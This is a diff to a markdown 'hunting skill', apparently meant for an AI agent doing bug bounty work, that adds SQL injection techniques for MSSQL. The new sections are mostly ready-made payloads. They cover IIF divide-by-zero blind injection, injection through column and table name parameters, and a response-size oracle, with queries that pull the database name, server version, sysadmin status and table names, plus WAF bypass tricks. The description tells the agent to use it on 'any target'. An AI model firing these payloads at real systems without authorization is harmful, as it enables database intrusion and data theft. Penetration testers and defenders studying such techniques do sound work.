@@ -1,6 +1,6 @@
 ---
 name: hunt-sqli
-description: Hunting skill for sqli vulnerabilities. Built from 12 public bug bounty reports including modern NoSQL injection (Rocket.Chat CVE-2021-22911 MongoDB $regex, Mongoose ORM CVE-2024-53900 $where bypass), modern ORM raw-fragment SQLi (Django CVE-2024-42005, Sequelize GHSA-wrh9-cjv3-2hpw), second-order SOQL injection (HackerOne Salesforce), time-based blind SQLi in GraphQL resolvers, and SQLi on OIDC-proxy backends. WAF bypass techniques include ELT() boolean/time-based substitution, CASE WHEN time-based (MySQL/MSSQL/PostgreSQL), MSSQL CHOOSE(), comment-split obfuscation, and chunked transfer encoding. Use when hunting SQLi / NoSQLi on any target.
+description: Hunting skill for sqli vulnerabilities. Built from 12 public bug bounty reports including modern NoSQL injection (Rocket.Chat CVE-2021-22911 MongoDB $regex, Mongoose ORM CVE-2024-53900 $where bypass), modern ORM raw-fragment SQLi (Django CVE-2024-42005, Sequelize GHSA-wrh9-cjv3-2hpw), second-order SOQL injection (HackerOne Salesforce), time-based blind SQLi in GraphQL resolvers, and SQLi on OIDC-proxy backends. WAF bypass techniques include ELT() boolean/time-based substitution, CASE WHEN time-based (MySQL/MSSQL/PostgreSQL), MSSQL CHOOSE(), IIF() divide-by-zero error-based blind, volume-based oracle (OR true → response too large → 500), identifier injection (column/table name params), comment-split obfuscation, and chunked transfer encoding. Use when hunting SQLi / NoSQLi on any target.
 sources: github, hackerone_public, github_security_advisories, snyk_research, sonarsource_research
 report_count: 12
 ---
@@ -336,6 +336,71 @@ ELT(5997=5996,'')          -- false → returns NULL
 ' AND CHOOSE(1,'a','b')='a'--              -- true
 ' AND CHOOSE(2,'a','b')='a'--              -- false
 '; IF CHOOSE(1,1,0)=1 WAITFOR DELAY '0:0:5'--
+```
+
+*IIF() divide-by-zero — MSSQL error-based blind (SQLMap default for ORDER BY/identifier params):*
+```sql
+-- Syntax: IIF(condition, true_result, false_result)
+-- True  → returns safe value → 200
+-- False → evaluates 1/0 → divide by zero → 500
+
+-- Detection (randomized canary — avoids 1=1 WAF signature)
+IIF(8551=8551,8551,1/0)     -- always true → 200 (safe)
+IIF(8551=8552,8551,1/0)     -- always false → 500 (1/0 fires)
+
+-- Data extraction
+IIF((SELECT db_name())='gateway',8551,1/0)
+IIF(IS_SRVROLEMEMBER('sysadmin')=1,8551,1/0)
+IIF(SUBSTRING(db_name(),1,1)='g',8551,1/0)
+IIF((SELECT TOP 1 table_name FROM information_schema.tables)='users',8551,1/0)
+
+-- Note: oracle is INVERTED vs volume-based — 500=false, 200=true
+-- Confirms MSSQL 2012+ (IIF is MSSQL-only)
+```
+
+*Identifier injection — column/table name parameters (always concatenated, never parameterizable):*
+```sql
+-- Recognise by param names: col*, table*, sort, orderBy, column, field, keyColums
+-- Backend: SELECT {colText} FROM {tableName} WHERE {keyColums} = '{keyValues}'
+
+-- Detection — append to column name value
+keyColums=precautionid'                    -- syntax error → 500
+keyColums=precautionid''                   -- valid escaped quote → 200 = confirmed injectable
+keyColums=precautionid'+or+'1'='1          -- classic boolean appended to identifier
+
+-- Error-based extraction in identifier position (MSSQL)
+keyColums=(SELECT @@version)=1 OR precautionid
+keyColums=(SELECT db_name())=1 OR precautionid
+keyColums=(SELECT SYSTEM_USER)=1 OR precautionid
+keyColums=(SELECT TOP 1 table_name FROM information_schema.tables)=1 OR precautionid
+
+-- Table name injection
+tableName=Sf_Precaution--
+tableName=Sf_Precaution;SELECT @@version--
+```
+
+*Volume-based oracle — "too large" / 500 overflow as boolean signal:*
+```sql
+-- Pattern: OR true → ALL rows returned → response too large → 500/"too large"
+--          OR false → only matching rows → normal response → 200
+-- Opposite of IIF oracle: here 500=TRUE, 200=FALSE
+
+-- Detection
+param=value' OR '1'='1     -- all rows → 500 or "message too large"
+param=value' OR '1'='2     -- normal rows → 200
+
+-- Controlled extraction using subquery (avoids flooding the table)
+param=value' OR (SELECT 1 WHERE SUBSTRING(db_name(),1,1)='g')=1--
+-- → 500/"too large" = condition true, 200 = condition false
+
+-- DB name confirmation
+param=value' OR (SELECT DISTINCT table_catalog FROM information_schema.tables)='gateway'--
+
+-- Sysadmin check
+param=value' OR IS_SRVROLEMEMBER('sysadmin')=1--
+
+-- Note: '1'='1 inside quotes (no --) works when closing quote is already in query
+-- Use -- variant when closing quote needs to be commented out
 ```
 
 *Header-based injection to avoid URL WAFs:*
